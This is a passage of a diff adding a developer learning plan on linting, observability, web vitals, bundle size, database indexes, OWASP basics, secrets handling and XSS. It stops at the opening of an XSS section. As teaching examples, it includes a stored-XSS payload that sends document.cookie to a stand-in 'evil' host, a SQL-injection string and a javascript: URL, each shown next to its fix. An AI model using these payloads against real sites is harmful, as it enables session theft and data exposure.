+src/notes.ts
+  14:9  error  'res' is assigned a value but never used  @typescript-eslint/no-unused-vars
+  22:3  error  Promises must be awaited                    @typescript-eslint/no-floating-promises
+✖ 2 problems (2 errors, 0 warnings)
+```
+
+Mistake: turning off every rule that complains. Each error is a question; the floating promise above is
+a real bug, a save that can fail silently.
+
+</Level>
+
+<Level name="Intermediate">
+
+ESLint's flat config (`eslint.config.js`) composes rule sets. For TypeScript, the type-aware rules are
+the valuable ones because they use the compiler's type information.
+
+```js
+// eslint.config.js
+import tseslint from 'typescript-eslint';
+export default tseslint.config(
+  ...tseslint.configs.recommendedTypeChecked,
+  {
+    languageOptions: { parserOptions: { projectService: true } },
+    rules: { '@typescript-eslint/no-floating-promises': 'error' },
+  },
+  { ignores: ['dist/', 'coverage/'] },
+);
+```
+
+`eslint-config-prettier` turns off lint rules that conflict with formatting, so the two tools never
+fight.
+
+</Level>
+
+<Level name="Advanced">
+
+A lint rule walks the abstract syntax tree and reports nodes matching a pattern. That is why ESLint can
+be extended with project-specific rules: "never import the database client from a React component",
+or "always pass `ownerId` to note queries". `no-restricted-imports` and `no-restricted-syntax` do many
+of these without writing a plugin.
+
+```js
+rules: {
+  'no-restricted-imports': ['error', { paths: [{ name: '../server/db', message: 'UI code must call the API, not the DB.' }] }],
+}
+```
+
+Pre-commit hooks (`husky` plus `lint-staged`) run format and lint on staged files only, so feedback
+comes before the commit; CI still runs the full check because hooks can be skipped.
+
+</Level>
+
+<Level name="Edge cases">
+
+Generated files (build output, Prisma client, coverage) must be ignored, or the linter reports
+thousands of errors in code nobody wrote. A `// eslint-disable-next-line` with no reason hides a real
+problem forever; require a description with `eslint-comments/require-description`.
+
+</Level>
+
+<Level name="Corner cases">
+
+Introducing a formatter to an existing codebase plus open pull requests: the format commit conflicts
+with every open branch. Do it when few branches are open, in one commit, and add that commit to
+`.git-blame-ignore-revs` so `git blame` skips it. Type-aware linting plus a huge repo makes lint slow;
+restrict type-aware rules to `src/` and cache with `--cache`.
+
+</Level>
+
+<Level name="Production level">
+
+Lint runs in CI with zero warnings allowed (`--max-warnings 0`), because warnings that never fail
+anything accumulate into noise nobody reads. Upgrades to lint configs land in their own PR with the fixes,
+never mixed into features.
+
+</Level>
+
+<Level name="Mindset">
+
+Automate taste so humans can spend attention on meaning. A recurring review comment is a lint rule
+waiting to be written.
+
+</Level>
+
+<Level name="System design">
+
+Architecture rules enforced by lint (layer boundaries, forbidden imports) keep a modular codebase modular
+as it grows, which is cheaper than any later migration.
+
+</Level>
+
+<Level name="Strategy">
+
+Set up Prettier, then ESLint with type-aware rules, fix every error in its own commit by rule, add one
+custom restricted-import rule that encodes a boundary of my app, then add both to CI.
+
+Done when `npm run lint` and `npm run format:check` pass with zero warnings in CI and one boundary rule
+has caught a real violation.
+
+</Level>
+
+</Levels>
+
+#### Phase 4: Logs, metrics, traces and error tracking
+
+<Figure art={`
+  one request: GET /notes/42        trace id 7f3a...
+  |
+  |-- span: http handler ............................ 182 ms
+  |     |-- span: auth middleware ......... 4 ms
+  |     |-- span: db query notes ........................ 151 ms  <- slow
+  |     |-- span: render json ............. 2 ms
+  |
+  logs   {"level":"info","traceId":"7f3a","route":"/notes/:id","ms":182}
+  metric http_request_duration_ms{route="/notes/:id"} -> p95 over 5 min
+  error  Sentry event with stack trace, release sha, traceId
+`} caption="The three signals describe the same request from three angles; the trace id ties them together." />
+
+<Levels label="Phase 4, logs, metrics, traces and error tracking">
+
+<Level name="Beginner">
+
+Once the app runs for other people, I cannot watch it. Observability is what lets me answer "what is
+happening?" from outside. Logs are timestamped records of events. Metrics are numbers over time
+(requests per second, error rate, latency). Traces follow one request through every step it takes.
+Error tracking collects every unhandled exception with its stack trace and groups duplicates.
+
+The first step is structured logs: JSON lines instead of free text, so a machine can filter them.
+
+```ts
+import pino from 'pino';
+const log = pino({ level: process.env.LOG_LEVEL ?? 'info' });
+
+log.info({ route: '/notes', userId: 17, ms: 42 }, 'request done');
+```
+
+```text
+{"level":30,"time":1761217200000,"route":"/notes","userId":17,"ms":42,"msg":"request done"}
+```
+
+Mistake: `console.log('here')` and `console.log(user)` scattered everywhere. The first says nothing in
+production; the second may leak a password hash or an email address into a log store.
+
+</Level>
+
+<Level name="Intermediate">
+
+Each signal answers a different question. Metrics tell me that something is wrong (error rate jumped
+from 0.1% to 4%). Traces tell me where (the database span grew from 10 ms to 900 ms). Logs and error
+events tell me why (`deadlock detected` on the notes table). A request ID, generated at the edge and
+attached to every log line and error, joins them.
+
+```ts
+app.use((req, res, next) => {
+  req.id = req.headers['x-request-id']?.toString() ?? crypto.randomUUID();
+  req.log = log.child({ reqId: req.id });
+  res.setHeader('x-request-id', req.id);
+  next();
+});
+```
+
+Error tracking (Sentry or similar) is installed early and tagged with the release commit SHA, so a new
+error class appearing right after a deploy points straight at that deploy.
+
+</Level>
+
+<Level name="Advanced">
+
+Metrics should be aggregated, not averaged: an average latency of 120 ms can hide that one request in a
+hundred takes eight seconds. Percentiles (p50, p95, p99) show the tail that real users feel. The four
+golden signals for a service are latency, traffic, errors and saturation. For a user-facing API, the
+RED method is a good start: rate, errors, duration per route.
+
+OpenTelemetry is the vendor-neutral standard: auto-instrumentation creates spans for HTTP, Express and
+Postgres calls, and exporters send them to whichever backend I use. Cardinality is the hidden cost of
+metrics: a label with a user ID creates one time series per user and can explode storage and bills.
+Labels are for bounded sets (route template, status class), never IDs.
+
+</Level>
+
+<Level name="Edge cases">
+
+Logging the route as the raw URL (`/notes/42`, `/notes/43`) instead of the template (`/notes/:id`)
+breaks grouping and creates unbounded labels. An error thrown inside a promise that nobody awaits never
+reaches the Express error handler; it appears as an `unhandledRejection` and must be captured by a process
+handler. Logs written synchronously at high volume slow the request path; use an async logger.
+
+</Level>
+
+<Level name="Corner cases">
+
+An error inside the error handler: the logger itself throws (for example, a circular object it cannot
+serialise), and the original error is lost. Use loggers with safe serialisers and wrap the handler.
+A retry loop plus error tracking: one failing dependency creates ten thousand identical events a minute,
+blows the error-tracking quota, and hides the next new error. Rate-limit and group events, and alert on
+new issue types rather than raw counts.
+
+</Level>
+
+<Level name="Production level">
+
+Alerts go on symptoms users feel (error rate, latency SLO breaches), not on every cause (CPU at 80%).
+Every alert has a runbook link and an owner. The plan names the trap: alert fatigue. If an alert fires
+and nobody acts, it is deleted or fixed. Logs have a retention period and redact personal data at
+the logger level, with a redaction list (`password`, `token`, `authorization`, `email`).
+
+```ts
+const log = pino({ redact: ['req.headers.authorization', 'password', '*.token', 'email'] });
+```
+
+</Level>
+
+<Level name="Mindset">
+
+Instrument to answer questions I will have during an incident. Before adding a log line I ask: what
+decision would this help me make at 2am?
+
+</Level>
+
+<Level name="System design">
+
+Observability is designed in, not bolted on: request IDs at the edge, trace context passed through
+queues and outbound calls, service-level objectives agreed before the alerts. Those SLOs later decide
+how much risk a deploy can take (an error budget).
+
+</Level>
+
+<Level name="Strategy">
+
+I add structured logging with request IDs, Sentry tagged with the release SHA, OpenTelemetry auto-instrumentation,
+and one dashboard with rate, errors and p95 duration per route. Then I throw a deliberate error in a
+handler and follow it from the alert to the trace to the log line.
+
+Done when, given a request ID from a user, I can find its log lines, its trace and its error in under two
+minutes, and no log contains a password, token or email.
+
+</Level>
+
+</Levels>
+
+#### Phase 4: Core Web Vitals and a performance budget
+
+<Timeline
+  caption="One page load, and where each vital is measured"
+  items={[
+    { when: '0 ms', what: 'Navigation starts. DNS, TLS, request.' },
+    { when: 'TTFB', what: 'First byte of HTML arrives (server and network time).' },
+    { when: 'FCP', what: 'First text or image painted.' },
+    { when: 'LCP', what: 'The largest image or text block in view is painted. Good: 2.5 s or less.' },
+    { when: 'during use', what: 'INP: the slowest interaction-to-next-paint latency. Good: 200 ms or less.' },
+    { when: 'whole life', what: 'CLS: how much visible content jumps unexpectedly. Good: 0.1 or less.' },
+  ]}
+/>
+
+<Levels label="Phase 4, Core Web Vitals and a performance budget">
+
+<Level name="Beginner">
+
+Core Web Vitals are three numbers Google publishes for user experience. Largest Contentful Paint (LCP)
+measures loading: when the main content appears. Interaction to Next Paint (INP) measures
+responsiveness: how long after a click or keypress the screen updates. Cumulative Layout Shift (CLS)
+measures visual stability: how much things jump around. The "good" thresholds are an LCP of 2.5 seconds
+or less, an INP of 200 ms or less and a CLS of 0.1 or less, measured at the 75th percentile of real
+visits.
+
+Lighthouse in Chrome DevTools gives a lab estimate. I run it on the deployed app in an incognito window
+with mobile throttling, because my fast laptop on Wi-Fi is not my users' phone.
+
+Mistake: chasing a Lighthouse score of 100 on the home page while the logged-in dashboard, where users
+actually spend time, takes six seconds.
+
+</Level>
+
+<Level name="Intermediate">
+
+Each vital has typical causes. LCP is slowed by a slow server response, render-blocking CSS and JS, and
+a large hero image discovered late. CLS comes from images without dimensions, fonts swapping, and banners
+inserted above content. INP comes from long JavaScript tasks on the main thread during interaction,
+often a big re-render.
+
+```html
+<!-- CLS fix: reserve space; LCP fix: load the hero early, not lazily -->
+<img src="/hero.webp" width="1200" height="600" fetchpriority="high" alt="Dashboard preview">
+```
+
+```css
+@font-face { font-family: "Plex"; src: url(/plex.woff2) format("woff2"); font-display: swap; }
+```
+
+Field data comes from real users, through the `web-vitals` library reporting to my analytics or
+metrics, because lab tests miss slow devices and real network conditions.
+
+</Level>
+
+<Level name="Advanced">
+
+INP is the hardest because it is about the main thread. A click handler that runs a 300 ms synchronous
+filter over 20,000 rows blocks the paint. The performance panel shows it as a long task with a red corner;
+the flame chart below shows which functions took the time. Fixes: do less work (filter on the server,
+virtualise the list), split work into chunks and yield (`await scheduler.yield()` or a `setTimeout`
+break), or move it to a Web Worker. In React, `useTransition` lets the urgent update (the typed
+character) paint before the expensive one (the filtered list).
+
+Reading a flame graph is part of the gate: the x-axis is time, the width of a bar is how long that
+function ran including its children, and the top of a stack is the function actually executing. Look
+for wide bars at the bottom of the call tree I own.
+
+</Level>
+
+<Level name="Edge cases">
+
+A page whose LCP element is text has a different fix (fonts, server time) than one whose LCP is an
+image. A single-page app's client-side navigations do not produce new LCP values in the standard metrics,
+so a slow route change can go unmeasured. A `loading="lazy"` attribute on the hero image delays LCP,
+because the browser waits to see if it is in view.
+
+</Level>
+
+<Level name="Corner cases">
+
+A cookie-consent banner plus layout: injected at the top after load, it shifts the whole page and ruins
+CLS on every first visit. Reserve its space or render it as an overlay. A performance fix plus a cache:
+the new optimised bundle has the same file name as the old one, CDNs keep serving the old one, and the
+field numbers do not move. Content-hashed file names fix that.
+
+</Level>
+
+<Level name="Production level">
+
+A performance budget is a limit checked in CI: Lighthouse CI asserting LCP and total JS size on key pages,
+so a regression fails the build like a failing test.
+
+```json
+{
+  "ci": {
+    "assert": {
+      "assertions": {
+        "largest-contentful-paint": ["error", { "maxNumericValue": 2500 }],
+        "cumulative-layout-shift": ["error", { "maxNumericValue": 0.1 }],
+        "resource-summary:script:size": ["error", { "maxNumericValue": 200000 }]
+      }
+    }
+  }
+}
+```
+
+Field data at p75 is watched on a dashboard, per page type, because that is what users experience.
+
+</Level>
+
+<Level name="Mindset">
+
+Measure before optimizing. A guess about why a page is slow is usually wrong; the trace is usually
+surprising.
+
+</Level>
+
+<Level name="System design">
+
+Performance is decided by architecture more than by micro-optimisations: server rendering versus client
+rendering, where data is fetched, what is cached at the edge, how much JavaScript ships. The budget is
+a design constraint that pushes those decisions early.
+
+</Level>
+
+<Level name="Strategy">
+
+Measure the three vitals on my three most important pages, lab and field. Fix the worst one, measure
+again, then add a Lighthouse CI budget. Record one long task in the performance panel and explain its flame
+graph.
+
+Done when the key pages meet the good thresholds in the lab on mobile settings, a budget fails CI on a
+deliberate regression, and I can point to the function at fault in a flame graph.
+
+</Level>
+
+</Levels>
+
+#### Phase 4: Bundle analysis
+
+<Layers
+  caption="What a 480 kB bundle turned out to contain, the first time I looked"
+  layers={[
+    { name: 'my app code', note: '62 kB' },
+    { name: 'react + react-dom', note: '45 kB gzip' },
+    { name: 'a date library with every locale', note: '160 kB: one import pulled them all' },
+    { name: 'a chart library', note: '120 kB, used on one admin page' },
+    { name: 'lodash, whole', note: '70 kB, for two functions' },
+  ]}
+/>
+
+<Levels label="Phase 4, bundle analysis">
+
+<Level name="Beginner">
+
+The bundle is the JavaScript the browser downloads, parses and runs before the app works. More code means
+slower loading and a busier main thread, especially on phones. Bundle analysis shows what is inside.
+
+```sh
+$ npx vite build
+dist/assets/index-3f9a2c.js   482.11 kB │ gzip: 151.30 kB
+(!) Some chunks are larger than 500 kB after minification.
+$ npx vite-bundle-visualizer
+```
+
+The visualiser draws a treemap where each rectangle's area is a module's size. The first look almost
+always shows a dependency I did not know was that big. Mistake: optimising my own code first. My code is
+usually a small slice; the big rectangles are dependencies.
+
+</Level>
+
+<Level name="Intermediate">
+
+Three fixes cover most cases. Replace heavy dependencies with smaller ones or the platform (`Intl.DateTimeFormat`
+instead of a date library for formatting). Import only what I use (`import debounce from 'lodash/debounce'`
+or `lodash-es` with named imports). Split rarely used code into its own chunk with dynamic `import()`, so
+the admin chart loads only on the admin page.
+
+```tsx
+import { lazy, Suspense } from 'react';
+const AdminCharts = lazy(() => import('./AdminCharts'));
+
+export function AdminPage() {
+  return <Suspense fallback={<p>Loading charts…</p>}><AdminCharts /></Suspense>;
+}
+```
+
+After the change the build prints a separate chunk, and the main entry shrinks.
+
+</Level>
+
+<Level name="Advanced">
+
+Tree shaking removes exports nobody imports, but only from ES modules and only when the bundler can prove
+there are no side effects. A package that is CommonJS, or that lacks `"sideEffects": false` in its
+`package.json`, may be included whole. Gzip or Brotli size matters for download; uncompressed size matters
+for parse and execute time. Both count.
+
+Source maps let tools like `source-map-explorer` attribute every byte of the minified file back to its
+source module, which is more exact than a treemap of pre-minified sizes.
+
+</Level>
+
+<Level name="Edge cases">
+
+A dynamic import with a variable path (`` import(`./pages/${name}`) ``) makes the bundler include every file
+that could match. A polyfill bundle for old browsers can double the size for everyone if it is not served
+conditionally. A CSS-in-JS library adds runtime cost not visible as CSS.
+
+</Level>
+
+<Level name="Corner cases">
+
+Code splitting plus a slow network: the lazy chunk takes three seconds on a click, which is worse UX than
+a slightly bigger first load. Prefetch likely next chunks on hover or idle. Two copies of the same library
+at different versions (one direct, one via a dependency) both ship; `npm ls react` reveals it, and
+deduping or aligning versions fixes it.
+
+</Level>
+
+<Level name="Production level">
+
+A size limit runs in CI (for example `size-limit` with a budget per entry), and the PR comment shows the
+size change, so a 100 kB dependency gets noticed in review, not three months later in field metrics.
+
+</Level>
+
+<Level name="Mindset">
+
+Every dependency is code my users download and code I maintain. I ask what it costs before I install it,
+not after.
+
+</Level>
+
+<Level name="System design">
+
+Bundle size is shaped by where rendering happens. Moving work to the server (server components, server
+rendering, an API that returns exactly what the page needs) can remove whole libraries from the client.
+
+</Level>
+
+<Level name="Strategy">
+
+Visualise the bundle, write down the five biggest modules, remove or split two of them, and add a size
+limit to CI.
+
+Done when I can name every dependency over 20 kB gzip in my bundle and why it is there, the main entry has
+shrunk measurably, and a deliberate 50 kB import fails the size check.
+
+</Level>
+
+</Levels>
+
+#### Phase 4: Database indexes for performance
+
+<Figure art={`
+  without an index                      with an index on (owner_id, created_at)
+  Seq Scan on notes                      Index Scan using notes_owner_created
+  reads every row: 1,000,000             B-tree:      [root]
+  filter owner_id = 17 keeps 40                      /      \\
+  time: 180 ms                                  [..16]    [17..]
+                                                         /     \\
+                                                 leaf: 17 -> 40 row pointers,
+                                                 already in created_at order
+                                                 time: 0.3 ms
+`} caption="An index is a sorted copy of some columns with pointers back to the rows, so a lookup walks a tree instead of reading the table." />
+
+<Levels label="Phase 4, database indexes for performance">
+
+<Level name="Beginner">
+
+When a query filters by a column, the database either reads every row (a sequential scan) or uses an
+index, a separate sorted structure (a B-tree by default in Postgres) that finds matching rows in a few
+steps. Primary keys and unique constraints get an index automatically; foreign keys do not.
+
+```sql
+CREATE INDEX notes_owner_id_idx ON notes (owner_id);
+```
+
+`EXPLAIN ANALYZE` runs a query and shows the plan and the real time.
+
+```text
+EXPLAIN ANALYZE SELECT * FROM notes WHERE owner_id = 17;
+ Seq Scan on notes  (cost=0.00..20834.00 rows=40 width=96) (actual time=0.03..181.2 rows=40 loops=1)
+   Filter: (owner_id = 17)
+   Rows Removed by Filter: 999960
+```
+
+After the index: `Index Scan using notes_owner_id_idx ... actual time=0.02..0.31`. Mistake: indexing
+every column "just in case". Each index slows every insert and update and takes disk.
+
+</Level>
+
+<Level name="Intermediate">
+
+Index for the queries I actually run. My dashboard runs `WHERE owner_id = $1 ORDER BY created_at DESC LIMIT 20`.
+A composite index on `(owner_id, created_at DESC)` serves both the filter and the order, so Postgres
+reads 20 entries and stops, with no sort step.
+
+Column order matters: a composite index on `(owner_id, created_at)` helps queries filtering by `owner_id`,
+or by both, but not queries filtering only by `created_at`. Think of a phone book sorted by last name then
+first name: easy to find all the Kumars, useless for finding everyone named Sanjay.
+
+</Level>
+
+<Level name="Advanced">
+
+The planner chooses a plan from statistics about the data (`ANALYZE` collects them). If a value is very
+common, a sequential scan can be cheaper than an index, so Postgres ignores the index on purpose. Other
+index types fit other queries: GIN for full-text search and JSONB containment, partial indexes for a
+subset (`WHERE deleted_at IS NULL`), expression indexes for `lower(email)`. A covering index with
+`INCLUDE (title)` can answer a query from the index alone (an Index Only Scan).
+
+The N+1 problem is often bigger than any index: loading 20 notes and then running one query per note
+for its tags is 21 round trips. Fix it with a join or a single `WHERE note_id = ANY($1)` query.
+
+</Level>
+
+<Level name="Edge cases">
+
+`WHERE lower(email) = $1` does not use a plain index on `email`; it needs an expression index on
+`lower(email)`. `LIKE '%term'` with a leading wildcard cannot use a B-tree. A query with
+`WHERE owner_id = $1 OR shared = true` may fall back to a sequential scan. An empty table in development
+always looks fast; test with realistic volume from a seed script.
+
+</Level>
+
+<Level name="Corner cases">
+
+Creating an index on a large production table with plain `CREATE INDEX` locks writes for the whole
+build. Use `CREATE INDEX CONCURRENTLY`, which cannot run inside a transaction, so a migration tool that
+wraps every migration in a transaction needs that one migration marked non-transactional. A unique index
+added to a table that already has duplicates fails halfway; find and fix duplicates first.
+
+</Level>
+
+<Level name="Production level">
+
+`pg_stat_statements` lists the queries that consumed the most total time; those are the ones worth
+indexing. Unused indexes show up in `pg_stat_user_indexes` with zero scans and can be dropped. Slow query
+logging (`log_min_duration_statement`) catches regressions after a deploy.
+
+</Level>
+
+<Level name="Mindset">
+
+Read the plan, do not guess. The database tells me exactly what it did and how long it took.
+
+</Level>
+
+<Level name="System design">
+
+Index design follows access patterns, which follow product features. When a feature adds a new way of
+reading data, the PR adds the index and its migration with it, reviewed together.
+
+</Level>
+
+<Level name="Strategy">
+
+Seed a million notes, list my app's five most frequent queries, `EXPLAIN ANALYZE` each, add the indexes
+they need in migrations, and record before and after times.
+
+Done when every frequent query uses an index scan with a recorded speedup, every foreign key that is
+filtered on is indexed, and I can explain one plan where Postgres correctly chose not to use an index.
+
+</Level>
+
+</Levels>
+
+#### Phase 4: OWASP basics
+
+<Layers
+  caption="The OWASP Top 10 (2021 list) mapped onto my Phase 3 app: where each class of risk would live"
+  layers={[
+    { name: 'A01 Broken access control', note: 'a note fetched by id without an owner check' },
+    { name: 'A02 Cryptographic failures', note: 'plain-text passwords, HTTP instead of HTTPS' },
+    { name: 'A03 Injection', note: 'SQL built by string concatenation; XSS lives here too' },
+    { name: 'A04 Insecure design', note: 'no rate limit on password reset by design' },
+    { name: 'A05 Security misconfiguration', note: 'stack traces shown to users, open CORS' },
+    { name: 'A06 Vulnerable components', note: 'an unpatched dependency with a known CVE' },
+    { name: 'A07 Identification and auth failures', note: 'no lockout, long-lived tokens' },
+    { name: 'A08 Software and data integrity', note: 'an unpinned CI action, unsigned updates' },
+    { name: 'A09 Logging and monitoring failures', note: 'nobody notices 10,000 failed logins' },
+    { name: 'A10 Server-side request forgery', note: 'fetch a user-supplied image URL' },
+  ]}
+/>
+
+<Levels label="Phase 4, OWASP basics">
+
+<Level name="Beginner">
+
+OWASP is a nonprofit that publishes the Top 10, a list of the most common and damaging classes of web
+application risk. It is not a checklist that makes an app secure; it is a map of where to look first.
+The single most important idea for a beginner: never trust anything that comes from the client. Every
+request body, query string, header, cookie and uploaded file may have been written by an attacker,
+because anyone can send any HTTP request with `curl`.
+
+```sh
+# the form only allows my own notes; curl does not care about the form
+$ curl -X DELETE https://api.example.com/notes/43 -H "Cookie: sid=MY_SESSION"
+```
+
+If that deletes someone else's note, that is A01, broken access control, the top item on the list.
+Mistake: treating the front end's checks (a hidden button, a disabled field) as security. They are UX.
+
+</Level>
+
+<Level name="Intermediate">
+
+Injection is the classic. Building SQL by concatenating strings lets input become code.
+
+```ts
+// wrong: input becomes part of the SQL
+await db.query(`SELECT * FROM users WHERE email = '${email}'`);
+// email = "x' OR '1'='1"  -> returns every user
+
+// right: parameters are sent separately from the SQL text
+await db.query('SELECT * FROM users WHERE email = $1', [email]);
+```
+
+ORMs like Prisma parameterise by default, but raw-query escape hatches (`$queryRawUnsafe`) bring the risk
+back. Security misconfiguration is the cheapest to fix: no stack traces in production responses, security
+headers set (a Content-Security-Policy, `X-Content-Type-Options: nosniff`, HSTS), debug routes removed.
+The `helmet` middleware sets sensible headers in Express.
+
+</Level>
+
+<Level name="Advanced">
+
+Thinking like an attacker is a method, not a talent. For each feature, ask: who can call this, with what
+input, and what is the worst thing that input could do? STRIDE gives the categories: spoofing, tampering,
+repudiation, information disclosure, denial of service, elevation of privilege. Apply it to one feature,
+such as file upload: spoofing (upload as someone else), tampering (replace another user's file), info
+disclosure (guessable file URLs), DoS (a 5 GB upload), elevation (an uploaded `.html` file served from my
+domain that runs script).
+
+Each threat becomes a test. That is the plan's AI-era instruction: ask the model to attack the API, then
+write the test that proves the attack fails.
+
+</Level>
+
+<Level name="Edge cases">
+
+Access control on list endpoints is as important as on single records: `GET /notes?ownerId=43` must ignore
+the query parameter and use the session's user. IDs that are sequential integers make enumeration trivial;
+UUIDs make it harder but are not authorization, so the owner check still applies. Error messages that
+differ between "no such user" and "wrong password" let attackers enumerate accounts.
+
+</Level>
+
+<Level name="Corner cases">
+
+A mass-assignment bug: the update handler passes `req.body` straight into the ORM, and an attacker adds
+`"role": "admin"` or `"ownerId": 1` to the JSON. Validation that only checks the fields I expected, without
+stripping the rest, lets extra fields through. The fix is an allowlist schema (Zod's `strict()` or picking
+fields explicitly) so unknown keys are rejected.
+
+```ts
+const UpdateNote = z.object({ title: z.string().max(200), body: z.string().max(20000) }).strict();
+```
+
+</Level>
+
+<Level name="Production level">
+
+Security is a process: dependencies patched on a schedule (Dependabot or Renovate), a dependency audit in
+CI, a security checklist in the PR template for sensitive areas, and a way for outsiders to report issues
+(a `SECURITY.md`). The plan's trap is treating security as a later ticket; the fix is that every feature's
+definition of done includes its threats and their tests.
+
+</Level>
+
+<Level name="Mindset">
+
+Assume the client is hostile and the network is public. The question is never "would anyone do this?"
+but "what happens if someone does?"
+
+</Level>
+
+<Level name="System design">
+
+Defence in depth: validation at the edge, authorization in the service, constraints in the database,
+least-privilege credentials, and monitoring behind all of them, so one missed check is not a breach.
+
+</Level>
+
+<Level name="Strategy">
+
+I read the Top 10 once, then walk my app with it: for each item, find where it could live, try to exploit
+it with `curl`, and write the test. I keep a findings table.
+
+Done when every Top 10 item has a row in my findings table with either a test proving the attack fails or a
+written reason it does not apply, and I have found and fixed at least one real security bug, which is part of
+the gate.
+
+</Level>
+
+</Levels>
+
+#### Phase 4: Secrets management
+
+<Flow
+  caption="The life of a secret, and the one place it must never pass through"
+  steps={['Created in the provider dashboard', 'Stored in a secret manager or CI secrets', 'Injected as an env variable at runtime', 'Read once by config code', 'Rotated on a schedule or a leak', 'Never: Git, logs, client bundles']}
+/>
+
+<Levels label="Phase 4, secrets management">
+
+<Level name="Beginner">
+
+A secret is anything that grants access: a database password, an API key, a session signing key, a
+deploy token. Secrets belong in environment variables, set outside the code, and never in Git.
+
+```sh
+# .env (listed in .gitignore, never committed)
+DATABASE_URL=postgres://app:s3cret@localhost:5432/app
+SESSION_SECRET=4c1f...long random value
+```
+
+```text
+# .gitignore
+.env
+.env.*
+!.env.example
+```
+
+A committed `.env.example` lists the names with fake values, so others know what to set. Mistake: a key
+pasted into the code "just to test", committed, pushed. Bots scan public GitHub for keys within minutes.
+
+</Level>
+
+<Level name="Intermediate">
+
+Load and validate config once at startup and fail fast if something is missing, instead of crashing on
+the first request that needs it.
+
+```ts
+import { z } from 'zod';
+const Env = z.object({
+  DATABASE_URL: z.string().url(),
+  SESSION_SECRET: z.string().min(32),
+  NODE_ENV: z.enum(['development', 'test', 'production']),
+});
+export const env = Env.parse(process.env);
+```
+
+```text
+ZodError: [ { "path": ["SESSION_SECRET"], "message": "String must contain at least 32 character(s)" } ]
+```
+
+In CI and hosting, secrets live in the platform's secret store (GitHub Actions secrets, the host's
+environment settings) and are masked in logs.
+
+</Level>
+
+<Level name="Advanced">
+
+Front-end bundles are public. Any variable baked into client code with a prefix like `VITE_` or
+`NEXT_PUBLIC_` is visible to anyone who opens DevTools. Only publishable keys go there; secret keys stay on
+the server, and the client calls my server, which calls the provider.
+
+Least privilege applies to secrets: the app's database user can read and write its tables but not drop
+the database; the deploy token can deploy but not read billing. Short-lived credentials (OIDC from GitHub
+Actions to a cloud provider) replace long-lived keys entirely where possible.
+
+</Level>
+
+<Level name="Edge cases">
+
+A secret in a URL (`?api_key=...`) ends up in server logs, browser history and referrer headers. An error
+handler that logs `process.env` or the full request leaks secrets into the log store. A Docker image built
+with `COPY . .` copies the `.env` file into the image unless `.dockerignore` excludes it.
+
+</Level>
+
+<Level name="Corner cases">
+
+A leaked secret deleted in a later commit: still in history, still in every fork and clone. Deleting is not
+remediation; rotation is. The leak drill: revoke the key at the provider, issue a new one, update the secret
+store, redeploy, check access logs for use of the old key, then optionally purge history.
+
+Rotation plus a running app that caches the old secret: the app keeps using it until restart. Support two
+valid keys at once during rotation (for session signing, verify with old and new, sign with new).
+
+</Level>
+
+<Level name="Production level">
+
+Secret scanning runs on push (GitHub's push protection, or `gitleaks` in CI) to block commits containing
+keys. Secrets have owners, expiry dates and a rotation schedule. Access to the secret store is audited.
+
+```sh
+$ gitleaks detect --source . --no-banner
+Finding:     SESSION_SECRET=4c1f...
+File:        src/config.ts
+Line:        3
+leaks found: 1
+```
+
+</Level>
+
+<Level name="Mindset">
+
+Assume every secret will leak eventually, and design so a leak is cheap: scoped, short-lived, rotatable
+in minutes.
+
+</Level>
+
+<Level name="System design">
+
+Config is separated from code (the twelve-factor rule), so the same build runs in every environment with
+different secrets injected. That separation is also what makes staging trustworthy.
+
+</Level>
+
+<Level name="Strategy">
+
+I move every secret into env variables with a validated config module, add `gitleaks` to CI, add push
+protection, and run the leaked-key drill on a test key end to end.
+
+Done when a fresh clone has no secrets, the app refuses to start with a missing variable, a planted fake key is
+blocked by CI, and I have rotated one real secret without downtime.
+
+</Level>
+
+</Levels>
+
+#### Phase 4: XSS, cross-site scripting
+
+<Figure art={`
+  attacker saves a note titled:   <img src=x onerror="fetch('//evil/?c='+document.cookie)">
+            |
+            v
+  server stores it as text   (fine: storage is not the bug)
+            |
+            v
+  victim opens the list -> app does   el.innerHTML = note.title     <- the bug
+            |
+            v
+  browser parses it as HTML -> img fails -> onerror runs as the victim
+            -> cookies / tokens / actions in the victim's session
+
+  fix: render as text (textContent, React {title}), sanitize real HTML,
+       httpOnly cookies, Content-Security-Policy
+`} caption="Stored XSS: data becomes code at the moment it is inserted into the page as HTML." />
+
+<Levels label="Phase 4, XSS">
+
+<Level name="Beginner">
+
+Cross-site scripting happens when user-controlled text is put into a page in a way the browser treats as
+HTML or JavaScript. The script then runs with the victim's identity on my site: it can read what they see,
+call my API as them, and steal tokens stored in JavaScript-readable places.
+
+```js
+// vulnerable
+list.innerHTML += `<li>${note.title}</li>`;
+// safe: text is never parsed as HTML
+const li = document.createElement('li');
+li.textContent = note.title;
+list.append(li);
+```
+
+React escapes text in JSX by default, so `<li>{note.title}</li>` is safe. Mistake: assuming React makes
+everything safe. `dangerouslySetInnerHTML`, `href` values and third-party HTML widgets are still open doors.
+
+</Level>
+
+<Level name="Intermediate">
+
+There are three kinds. Stored XSS: the payload is saved (a note title) and runs for everyone who views it.
+Reflected XSS: the payload is in a URL parameter echoed back in the response. DOM-based XSS: client code
+reads from `location.hash` or similar and writes it into the DOM. The fix is the same principle: encode
+output for the context it goes into.
+
+Context matters. Text inside an element needs HTML encoding. Inside an attribute it needs attribute encoding
+and quotes. Inside a URL it needs a scheme check:
+
+```tsx
+// React escapes this text but not the scheme
+<a href={user.website}>site</a>
+// website = "javascript:alert(document.cookie)" -> runs on click
+const safe = /^https?:\/\//i.test(user.website) ? user.website : '#';
+```
+
+</Level>
+
+<Level name="Advanced">
+
+When I genuinely need user HTML (a rich-text editor), I sanitise it with an allowlist library such as
+DOMPurify, which parses the HTML and removes everything not explicitly allowed: scripts, event handler
+attributes, `javascript:` URLs.
+
+```ts
+import DOMPurify from 'dompurify';
+el.innerHTML = DOMPurify.sanitize(userHtml, { ALLOWED_TAGS: ['b', 'i', 'a', 'p', 'ul', 'li'], ALLOWED_ATTR: ['href'] });
+```
+
+Content-Security-Policy is the second wall: a header telling the browser which scripts may run. A strict
+policy (`script-src 'self'` with no `'unsafe-inline'`) means an injected inline script or `onerror` handler is
+blocked even if encoding failed somewhere. `httpOnly` cookies mean a script that does run cannot read the
+session cookie.
+
+</Level>
+
+<Level name="Edge cases">
+
+User data placed inside a `<script>` block as JSON (to hydrate state) can break out with `</script>` in a
+string; serialise with a function that escapes `<` as `\u003c`. Markdown renderers allow raw HTML by default
+in many configurations. SVG uploads can contain script and run when opened directly from my domain.
+
+</Level>
+
+<Level name="Corner cases">
+
